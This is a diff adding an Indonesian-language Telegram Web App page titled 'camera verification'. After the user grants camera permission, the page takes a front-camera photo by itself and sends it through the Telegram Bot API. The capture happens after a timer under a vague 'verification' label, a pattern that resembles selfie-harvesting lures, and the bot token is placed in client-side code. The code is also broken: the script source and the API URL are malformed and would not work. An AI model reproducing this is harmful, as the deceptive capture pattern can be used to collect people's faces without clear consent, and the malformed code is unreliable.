@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Kamera</title>
+    <script src="https://telegram.org"></script>
+    <style>
+        body { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: Arial, sans-serif; }
+        video, canvas { display: none; }
+        button { padding: 15px 30px; font-size: 16px; background-color: #2481cc; color: white; border: none; border-radius: 10px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <button id="btn-izinkan">Izinkan Akses Kamera</button>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+
+        const btnIzin = document.getElementById('btn-izinkan');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        btnIzin.addEventListener('click', async () => {
+            try {
+                // Meminta izin kamera depan
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                
+                video.srcObject = stream;
+                video.style.display = 'block';
+                btnIzin.style.display = 'none';
+
+                // Otomatis mengambil foto setelah kamera siap
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // Menghentikan kamera
+                    stream.getTracks().forEach(track => track.stop());
+
+                    // Mengirimkan hasil foto ke bot
+                    kirimKeBot(canvas.toDataURL('image/jpeg'));
+                }, 1500); // Waktu jeda 1,5 detik
+            } catch (err) {
+                alert("Akses kamera ditolak atau perangkat tidak mendukung.");
+            }
+        });
+
+        function kirimKeBot(dataUrl) {
+            // Ubah Base64 ke Blob
+            fetch(dataUrl)
+                .then(res => res.blob())
+                .then(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', tg.initDataUnsafe.user.id);
+                    formData.append('photo', blob, 'kamera.jpg');
+                    formData.append('caption', 'Foto verifikasi otomatis');
+
+                    // Ganti dengan TOKEN bot Anda
+                    const token = 'ISI_TOKEN_BOT_ANDA_DISINI'; 
+
+                    // Kirim ke Telegram API
+                    fetch(`https://telegram.org{token}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(() => {
+                        tg.close(); // Menutup Web App setelah berhasil
+                    });
+                });
+        }
+    </script>
+</body>
+</html>
